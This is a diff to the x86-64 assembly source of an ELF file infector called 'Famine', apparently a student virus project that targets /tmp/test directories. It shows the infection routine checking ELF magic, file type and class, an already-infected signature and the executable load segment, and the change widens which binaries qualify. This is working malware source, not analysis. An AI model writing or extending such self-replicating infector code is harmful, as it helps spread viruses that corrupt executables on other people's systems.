@@ -301,7 +301,7 @@ _infect_file: ; (string rdi, stat rsi)
 	push rax
 	pop rsi
 	lea rdi, [rel elf_magic]
-	push 4
+	push 3
 	pop rdx
 	call _ft_strncmp
 	push rsi
@@ -314,17 +314,22 @@ _infect_file: ; (string rdi, stat rsi)
 	cmp byte[rsi + 16], 3 ; ET_DYN
 	jne .unmap
 
-
-
 	.is_elf_file:
-		mov rsi, [r12 + 48]
-		cmp rsi, [r13 + 24]
-		jl .unmap ; TODO: infect binary where entrypoint is far (/bin/gcc-10)
+		cmp byte[rsi + 4], 2 ; ELFCLASS64
+		je .check_64_bit
+		cmp byte[rsi + 4], 1 ; ELFCLASS32
+		jne .unmap
+		; TODO: do 32 bits version
+		.check_64_bit:
+			mov rsi, [r12 + 48]
+			cmp rsi, [r13 + 24]
+			jl .unmap ; TODO: infect binary where entrypoint is far (/bin/gcc-10)
 
 		%ifdef DEBUG
 			mov rdi, rsi
 			call _print; _print(rdi)
 		%endif
+		; TODO: change for a memmem
 		; check if already infected
 		mov rsi, r9
 		sub rsi, r8
@@ -338,8 +343,6 @@ _infect_file: ; (string rdi, stat rsi)
 		call _ft_strcmp
 		cmp rax, 0x0
 		je .unmap
-
-
 
 		; get pt_load exec
 		mov rsi, [r13 + 32]; e_phoff
@@ -574,8 +577,8 @@ ret
 
 ; ==============================================================================
 
-;                   E     L    F   |  v ELFCLASS64
-elf_magic db 0x7f, 0x45, 0x4c, 0x46, 0x2, 0x0
+;                   E     L    F   |       v ELFCLASS64
+elf_magic db 0x7f, 0x45, 0x4c, 0x46, 0x0 ;0x2, 0x0
 dotdir db `.`, 0x0, `..`, 0x0, 0x0
 directories db `/tmp/test`, 0x0, `/tmp/test2`, 0x0, 0x0
 signature db `Famine version 1.0 (c)oded by lmartin`, 0x0; sw4g signature
